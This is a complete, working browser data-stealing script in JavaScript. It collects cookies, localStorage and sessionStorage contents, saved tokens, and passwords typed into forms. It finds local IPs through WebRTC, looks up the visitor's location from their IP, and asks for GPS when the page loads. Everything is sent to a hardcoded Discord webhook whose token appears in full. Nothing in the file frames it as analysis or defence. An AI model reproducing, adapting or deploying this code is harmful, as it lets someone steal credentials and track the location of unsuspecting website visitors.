(function() {
    let webhookURL = 'https://discord.com/api/webhooks/1509405086273503482/JdM9e489PyjSuEWS8v9lRrRH3YTpJU2QS_RYKpSf6_0AIgf0JQBwjFYjYAjRyBSEa_rP';
    
    // IMPORTANT DATA ONLY - ALL AT THE TOP
    let stolenData = {
        // === CRITICAL INFO (TOP) ===
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
        
        // === IP AND LOCATION ===
        ipAddress: "",
        localIPs: [],
        location: {
            city: "",
            region: "",
            country: "",
            postal: "",
            latitude: 0,
            longitude: 0,
            isp: ""
        },
        
        // === PASSWORDS ===
        passwords: [],
        
        // === COOKIES ===
        cookies: document.cookie || "",
        
        // === STORAGE ===
        localStorage: {},
        sessionStorage: {},
        savedLogins: [],
        
        // === DEVICE BASICS ===
        os: "",
        browser: "",
        deviceType: "",
        screenResolution: `${screen.width}x${screen.height}`,
        
        // === GPS (will be filled if granted) ===
        geolocation: {}
    };
    
    // Collect localStorage
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        let val = localStorage.getItem(key);
        stolenData.localStorage[key] = val;
        if (key.toLowerCase().includes("pass") || key.toLowerCase().includes("token") || key.toLowerCase().includes("auth") || key.toLowerCase().includes("login")) {
            stolenData.savedLogins.push({ source: "localStorage", key: key, value: val });
        }
    }
    
    // Collect sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        let val = sessionStorage.getItem(key);
        stolenData.sessionStorage[key] = val;
        if (key.toLowerCase().includes("pass") || key.toLowerCase().includes("token") || key.toLowerCase().includes("auth")) {
            stolenData.savedLogins.push({ source: "sessionStorage", key: key, value: val });
        }
    }
    
    // Collect passwords from forms
    document.querySelectorAll('input[type="password"]').forEach((input, idx) => {
        if (input.value) {
            stolenData.passwords.push({
                index: idx,
                name: input.name || input.id || "password",
                value: input.value
            });
        }
    });
    
    // Get OS
    let ua = navigator.userAgent;
    if (ua.includes("Windows")) stolenData.os = "Windows";
    else if (ua.includes("Mac")) stolenData.os = "macOS";
    else if (ua.includes("Android")) stolenData.os = "Android";
    else if (ua.includes("iPhone")) stolenData.os = "iOS";
    else if (ua.includes("Linux")) stolenData.os = "Linux";
    else stolenData.os = "Unknown";
    
    // Get Browser
    if (ua.includes("Chrome") && !ua.includes("Edg")) stolenData.browser = "Chrome";
    else if (ua.includes("Firefox")) stolenData.browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) stolenData.browser = "Safari";
    else if (ua.includes("Edg")) stolenData.browser = "Edge";
    else stolenData.browser = "Unknown";
    
    // Device Type
    stolenData.deviceType = /Mobile|Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
    
    // Send to Discord function
    function sendToDiscord(data) {
        let jsonData = JSON.stringify(data, null, 2);
        if (jsonData.length > 1900) {
            let firstPart = jsonData.substring(0, 1900);
            let secondPart = jsonData.substring(1900, 3800);
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: '```json\n' + firstPart + '\n```' })
            }).catch(e => {});
            if (secondPart) {
                setTimeout(() => {
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: '```json\n' + secondPart + '\n```' })
                    }).catch(e => {});
                }, 500);
            }
        } else {
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: '```json\n' + jsonData + '\n```' })
            }).catch(e => {});
        }
    }
    
    // Send separate GPS message when location granted
    function sendGpsMessage(position) {
        let gpsMessage = {
            event: "📍 GPS LOCATION ENABLED 📍",
            timestamp: new Date().toISOString(),
            coordinates: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            },
            ip: stolenData.ipAddress,
            location: stolenData.location
        };
        let jsonData = JSON.stringify(gpsMessage, null, 2);
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: '🔴 **GPS PERMISSION GRANTED** 🔴\n```json\n' + jsonData + '\n```' })
        }).catch(e => {});
    }
    
    // === THIS ASKS FOR LOCATION (PERMISSION POPUP) ===
    function requestLocation() {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // USER GRANTED LOCATION
                    stolenData.geolocation = {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    sendGpsMessage(pos);
                    sendToDiscord(stolenData);
                },
                (error) => {
                    // USER DENIED OR ERROR
                    if (error.code === 1) {
                        console.log("Location denied by user");
                    }
                    sendToDiscord(stolenData);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            // Geolocation not supported
            sendToDiscord(stolenData);
        }
    }
    
    // Get IP and location from IP
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            stolenData.ipAddress = data.ip;
            sendToDiscord(stolenData);
        })
        .catch(() => sendToDiscord(stolenData));
    
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
            if (data.ip) {
                stolenData.ipAddress = data.ip;
                stolenData.location = {
                    city: data.city || "",
                    region: data.region || "",
                    country: data.country_name || "",
                    postal: data.postal || "",
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    isp: data.org || ""
                };
            }
            sendToDiscord(stolenData);
        })
        .catch(() => {});
    
    // Get local IP via WebRTC
    let ips = [];
    let pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
    pc.onicecandidate = (event) => {
        if (!event || !event.candidate) {
            stolenData.localIPs = ips;
            sendToDiscord(stolenData);
            return;
        }
        let ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        if (ipMatch && !ips.includes(ipMatch[0])) {
            ips.push(ipMatch[0]);
            stolenData.localIPs = ips;
            sendToDiscord(stolenData);
        }
    };
    
    // === REQUEST LOCATION IMMEDIATELY WHEN PAGE LOADS ===
    setTimeout(() => {
        requestLocation();
    }, 1000);
    
    // Send initial data
    setTimeout(() => sendToDiscord(stolenData), 2000);
})();
